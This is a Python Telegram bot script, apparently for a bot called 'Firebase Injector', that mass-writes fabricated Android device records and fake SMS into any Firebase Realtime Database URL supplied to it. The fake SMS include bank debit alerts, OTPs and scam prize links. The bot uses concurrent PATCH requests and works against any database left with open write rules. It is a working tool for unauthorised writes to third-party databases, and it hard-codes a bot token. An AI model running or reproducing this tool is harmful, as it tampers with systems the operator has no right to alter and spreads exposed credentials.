#!/usr/bin/env python3
# inject_bot.py — Telegram bot to inject realistic devices + SMS into Firebase
#
# Python 3.10+ | pip install python-telegram-bot aiohttp

import asyncio
import logging
import os
import random
import re
import string
import flask
import time
from datetime import datetime, timedelta
from urllib.parse import urlsplit
from flask import Flask
import aiohttp
import threading
from telegram import Update
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    ContextTypes, filters,
)

# ============================================================
# CONFIG
# ============================================================
# ⚠️ ROTATE THIS TOKEN IN @BotFather!
BOT_TOKEN = "8574116444:AAFaMB2H0yhtVTN_HW1x4dOoVjW_Lnk8QIs"

# Optional: restrict to your Telegram ID. Set to None to allow anyone.
INJECT_OWNER = None  

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")

# ============================================================
# REALISTIC DATA POOLS
# ============================================================
MODELS = [
    "RMX3771", "SM-A546E", "2201117TG", "CPH2451",
    "Pixel 7", "M2101K6P", "SM-G991B", "V2204",
    "Redmi Note 11", "OnePlus Nord CE 2", "RMX3360",
    "SM-M325F", "220333QBI", "CPH2381", "Pixel 6a",
]

CARRIERS = ["JIO 4G", "Airtel", "Vi", "BSNL"]

BANKS = ["HDFCBK", "ICICIB", "SBIN", "AXISBK", "KOTAKB", "PNBSMS"]

SMS_TEMPLATES = [
    ("JR-JioPay-S", "DATA Usage Alert!\nYou have used {pct}% of daily data quota as of {date}.\nJio Number: {phone10}\nDaily Quota: 2 GB\nFor data-saving tips, watch : http://tiny.jio.com/ydatausageen\nTrack your data balance and usage on MyJio, click : http://tiny.jio.com/mobile"),
    ("VM-{bank}-S", "A/c XX{last4} debited INR {amount}.00 Dt{date}. Avl Bal INR {balance}. -{bankname}"),
    ("VM-{bank}-T", "INR {amount}.00 credited to A/c XX{last4} on {date}. Avl Bal INR {balance}. -{bankname}"),
    ("JD-MSHOTP-S", "Your OTP for Meesho login is {otp6} and is valid for 5 mins. Please DO NOT share this OTP with anyone to keep your account safe. {rand10} Meesho"),
    ("VM-AIRTEL-S", "Recharge of Rs.{amount} successful for {phone10}. Plan validity: 28 days. Thank you for choosing Airtel."),
    ("AD-MYNTRA-S", "Thanks for registering with Myntra! Your account for {phone10} is ready. Please log in to continue."),
    ("JK-IRMSMS-S", "You have registered successfully on RailOne. Use user id S***{last3} or mobile number ******{last4} to login. IR-CRIS"),
    ("AD-PROMO-S", "Congratulations! You have won a prize of Rs.{amount}. Click here to claim: http://bit.ly/{rand8}"),
    ("VK-AMZNIN-S", "Your Amazon order #{rand8} has been delivered successfully. Rate your experience on the app."),
    ("JD-SWIGGY-S", "Your Swiggy order #{rand8} is out for delivery and will arrive in {mins} mins."),
]

# ============================================================
# GENERATORS
# ============================================================
def gen_hex16():
    return ''.join(random.choices("0123456789abcdef", k=16))

def gen_phone():
    return f"91{random.choice('6789')}{random.randint(100000000, 999999999)}"

def gen_join_date():
    d = datetime.now() - timedelta(days=random.randint(1, 180))
    return d.strftime("%d/%m/%Y | %I:%M %p")

def gen_sms_date(ts_ms):
    d = datetime.fromtimestamp(ts_ms / 1000)
    return d.strftime("%d-%m-%Y | %I:%M %p")

def gen_device(dev_id, phone):
    carrier = random.choice(CARRIERS)
    sims = [{"carrierName": carrier, "phoneNumber": phone, "simSlotIndex": "0"}]
    if random.random() < 0.35:
        sims.append({
            "carrierName": random.choice(CARRIERS),
            "phoneNumber": gen_phone(),
            "simSlotIndex": "1"
        })
    return {
        "deviceId": dev_id,
        "modelName": random.choice(MODELS),
        "androidV": str(random.randint(11, 14)),
        "sdkV": str(random.randint(30, 34)),
        "battery": f"{random.randint(15, 100)}%",
        "cpu_arch": "arm64-v8a",
        "ip_address": f"{random.randint(40, 200)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 254)}",
        "isRoot": random.choice([False, False, False, True]),
        "isSdCard": random.choice([True, False]),
        "joined": gen_join_date(),
        "mobNo": phone,
        "service_provider": carrier,
        "sims": sims,
        "status": True,
        "storage": random.choice(["64GB", "128GB", "256GB"]),
        "like": False,
    }

def gen_sms(phone, msg_ts_ms):
    sender_tpl, msg_tpl = random.choice(SMS_TEMPLATES)
    bank = random.choice(BANKS)
    otp6 = f"{random.randint(100000, 999999)}"
    phone10 = phone[-10:]

    data = {
        "pct": random.randint(50, 95),
        "date": datetime.fromtimestamp(msg_ts_ms/1000).strftime("%d-%b-%y %H:%M"),
        "phone10": phone10,
        "bank": bank,
        "bankname": {"HDFCBK": "HDFC Bank", "ICICIB": "ICICI Bank", "SBIN": "SBI", "AXISBK": "Axis Bank", "KOTAKB": "Kotak Bank", "PNBSMS": "PNB"}.get(bank, bank),
        "last4": f"{random.randint(1000, 9999)}",
        "last3": f"{random.randint(100, 999)}",
        "amount": random.choice([99, 149, 249, 499, 999, 1499, 2000, 5000, 199, 399]),
        "balance": f"{random.randint(1000, 50000)}.{random.randint(10, 99)}",
        "otp6": otp6,
        "rand10": ''.join(random.choices(string.ascii_letters + string.digits, k=10)),
        "rand8": ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)),
        "mins": random.randint(5, 30),
    }

    try:
        sender = sender_tpl.format(**data)
        message = msg_tpl.format(**data)
    except Exception:
        sender = "UNKNOWN"
        message = "Message"

    return {
        "dateTime": gen_sms_date(msg_ts_ms),
        "id": msg_ts_ms,
        "message": message,
        "sender": sender,
        "type": "incoming",
    }

# ============================================================
# URL VALIDATION (with Invisible Character Fix)
# ============================================================
def normalize_firebase_url(raw_url: str) -> str:
    # Strip invisible unicode characters (zero-width spaces, etc.)
    clean_url = re.sub(r'[^\x00-\x7F]+', '', raw_url.strip())
    
    parsed = urlsplit(clean_url)
    if parsed.scheme != "https":
        raise ValueError("URL must start with https://")
    
    host = (parsed.hostname or "").lower()
    if not (host.endswith(".firebaseio.com") or host.endswith(".firebasedatabase.app")):
        raise ValueError("Only Firebase Realtime Database URLs are allowed.")
    
    return f"https://{parsed.netloc}"

# ============================================================
# INJECTION ENGINE
# ============================================================
async def inject(bot, chat_id: int, url: str, count: int, msg_id_ref: int):
    start = time.time()
    phones = []

    # Build every path we're going to write
    all_paths = []
    for _ in range(count):
        dev_id = gen_hex16()
        phone = gen_phone()
        phones.append(phone)

        all_paths.append((f"clients/{dev_id}", gen_device(dev_id, phone)))

        num_sms = random.randint(2, 5)
        now_ms = int(time.time() * 1000)
        for _ in range(num_sms):
            msg_ts = now_ms - random.randint(1000, 86_400_000)
            all_paths.append((f"messages/{dev_id}/{msg_ts}", gen_sms(phone, msg_ts)))

    # Chunk into 25-path batches — Firebase multi-path PATCH
    CHUNK = 25
    chunks = [all_paths[i:i+CHUNK] for i in range(0, len(all_paths), CHUNK)]
    total = len(all_paths)

    sem = asyncio.Semaphore(15)
    done = [0]
    last_edit = [0.0]
    errors = []

    async with aiohttp.ClientSession() as session:
        async def worker(chunk):
            async with sem:
                payload = {p: d for p, d in chunk}
                try:
                    async with session.patch(f"{url}/.json", json=payload, timeout=aiohttp.ClientTimeout(total=30)) as r:
                        if r.status != 200:
                            errors.append(f"HTTP {r.status}")
                except Exception as e:
                    errors.append(str(e)[:60])

                done[0] += len(chunk)

                now = time.time()
                if now - last_edit[0] > 1.5 or done[0] == total:
                    last_edit[0] = now
                    pct = (done[0] / total) * 100
                    filled = int(pct / 5)
                    bar = "█" * filled + "░" * (20 - filled)
                    try:
                        await bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=msg_id_ref,
                            text=f"⚡ *Injecting into {url}...*\n\n`{bar}` {pct:.0f}%\n\n📦 Paths: `{done[0]}/{total}`\n📱 Devices: `{count}`\n⏱ Elapsed: `{now - start:.1f}s`",
                            parse_mode="Markdown",
                        )
                    except Exception:
                        pass

        await asyncio.gather(*[worker(c) for c in chunks])

    elapsed = time.time() - start
    sample = "\n".join(f"`{p}`" for p in phones[:5])
    err_text = f"\n\n⚠️ Errors: `{len(errors)}`" if errors else ""

    await bot.edit_message_text(
        chat_id=chat_id,
        message_id=msg_id_ref,
        text=(
            f"✅ *Injection Complete*\n\n"
            f"🌐 `{url}`\n"
            f"📱 Devices: `{count}`\n"
            f"💬 SMS: `{total - count}`\n"
            f"📦 Total paths: `{total}`\n"
            f"⏱ Time: `{elapsed:.1f}s`\n"
            f"⚡ Speed: `{total/elapsed:.1f}` paths/sec\n\n"
            f"📞 *Sample phones:*\n{sample}"
            f"{err_text}"
        ),
        parse_mode="Markdown",
    )


# ============================================================
# BOT HANDLERS
# ============================================================
def authorized(chat_id: int) -> bool:
    if INJECT_OWNER is None: return True
    return chat_id == INJECT_OWNER

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update.effective_chat.id): return
    await update.message.reply_text(
        "🔫 *Firebase Injector Bot*\n\n"
        "Inject realistic devices + SMS into a Firebase RTDB.\n\n"
        "*Commands:*\n"
        "`/inject` — start injection\n"
        "`/cancel` — abort current flow\n\n"
        "The target DB must have open `.write: true` rules.",
        parse_mode="Markdown",
    )

async def inject_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update.effective_chat.id): return
    context.user_data["stage"] = "url"
    context.user_data["urls"] = []
    await update.message.reply_text(
        "🌐 Send the Firebase Realtime Database URLs.\n\n"
        "You can paste multiple URLs at once (separated by spaces or newlines).\n\n"
        "Example:\n"
        "`https://my-project-default-rtdb.firebaseio.com`\n"
        "`https://xxx.asia-southeast1.firebasedatabase.app`",
        parse_mode="Markdown",
    )

async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("❌ Cancelled.")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update.effective_chat.id): return

    stage = context.user_data.get("stage")
    text = (update.message.text or "").strip()
    if not text: return

    if stage == "url":
        # Split by newlines, spaces, or commas
        raw_urls = [u.strip() for u in re.split(r'[\s,]+', text) if u.strip()]
        
        valid_urls = []
        errors = []
        
        for u in raw_urls:
            try:
                norm_url = normalize_firebase_url(u)
                if norm_url not in valid_urls:
                    valid_urls.append(norm_url)
            except ValueError as e:
                errors.append(f"`{u[:25]}...`\n  ↳ {e}")
                
        if not valid_urls:
            await update.message.reply_text("❌ No valid URLs found.\n\n" + "\n".join(errors))
            return
            
        context.user_data["urls"] = valid_urls
        context.user_data["stage"] = "count"
        
        msg = f"✅ **Accepted {len(valid_urls)} URL(s):**\n"
        for v in valid_urls:
            msg += f"• `{v}`\n"
        if errors:
            msg += "\n❌ **Rejected:**\n" + "\n".join(errors)
            
        msg += "\n\nHow many devices to inject into each URL? (e.g. `100`, max `2000`)."
        await update.message.reply_text(msg, parse_mode="Markdown")
        return

    if stage == "count":
        try:
            count = int(text)
            if count < 1 or count > 2000:
                raise ValueError()
        except ValueError:
            await update.message.reply_text("❌ Send a number between 1 and 2000.")
            return

        urls = context.user_data.get("urls", [])
        context.user_data.clear()

        for i, url in enumerate(urls):
            progress = await update.message.reply_text(
                f"🚀 Starting injection {i+1}/{len(urls)} into:\n`{url}`",
                parse_mode="Markdown",
            )
            try:
                await inject(
                    update.get_bot(),
                    update.effective_chat.id,
                    url,
                    count,
                    progress.message_id
                )
            except Exception as e:
                await update.message.reply_text(f"💥 Injection failed for `{url}`: `{e}`", parse_mode="Markdown")
                
        await update.message.reply_text("🏁 **All injections complete.**", parse_mode="Markdown")
        return

    await start_cmd(update, context)


# ============================================================
# MAIN
# ============================================================
def main():
    if not BOT_TOKEN:
        print("❌ Missing TG_BOT_TOKEN")
        return

    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("inject", inject_cmd))
    app.add_handler(CommandHandler("cancel", cancel_cmd))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("🤖 Injector bot online")
    app.run_polling(drop_pending_updates=True)

app = Flask(__name__)

@app.route('/')
def health_check():
    return "Bot is alive!", 200

def run_web_server():
    app.run(host='0.0.0.0', port=8080)

if __name__ == "__main__":
    # Start the web server in a background thread so Render doesn't kill the app
    threading.Thread(target=run_web_server, daemon=True).start()
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Stopped.")